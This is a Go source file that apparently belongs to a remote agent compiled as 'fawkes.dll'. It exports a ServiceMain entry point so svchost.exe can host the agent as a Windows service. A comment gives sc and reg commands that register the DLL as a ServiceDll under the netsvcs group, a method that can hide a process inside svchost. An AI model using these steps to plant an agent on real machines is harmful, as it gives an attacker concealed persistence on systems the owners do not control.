//go:build shared && dllexports && windows
// +build shared,dllexports,windows

package main

import "C"
import (
	"syscall"
	"unsafe"
)

// ServiceMain is the DLL entry point for svchost.exe-hosted Windows services.
// Enables execution by registering as a DLL service:
//
//	sc create SvcName type= own binPath= "C:\Windows\System32\svchost.exe -k netsvcs"
//	reg add "HKLM\SYSTEM\CurrentControlSet\Services\SvcName\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\path\to\fawkes.dll"
//	sc start SvcName
//
// Unlike the EXE-mode service handler (service_windows.go which uses
// StartServiceCtrlDispatcher), this export is called directly by svchost.exe
// after loading the DLL.
//
//export ServiceMain
func ServiceMain(argc uint32, argv unsafe.Pointer) {
	// Register a control handler — reuse advapi32 procs and svcCtrlHandler
	// defined in service_windows.go (same package, same build constraints)
	emptyName, _ := syscall.UTF16PtrFromString("")
	svcStatusHandle, _, _ = procRegisterServiceCtrlHandlerExW.Call(
		uintptr(unsafe.Pointer(emptyName)),
		syscall.NewCallback(svcCtrlHandler),
		0,
	)

	// Tell SCM we're running
	status := serviceStatus{
		ServiceType:      serviceWin32OwnProcess,
		CurrentState:     serviceRunning,
		ControlsAccepted: serviceAcceptStop,
	}
	procSetServiceStatus.Call(svcStatusHandle, uintptr(unsafe.Pointer(&status)))

	// Run the agent (blocks until agent exits)
	runAgent()

	// Tell SCM we've stopped
	status.CurrentState = serviceStopped
	status.ControlsAccepted = 0
	procSetServiceStatus.Call(svcStatusHandle, uintptr(unsafe.Pointer(&status)))
}
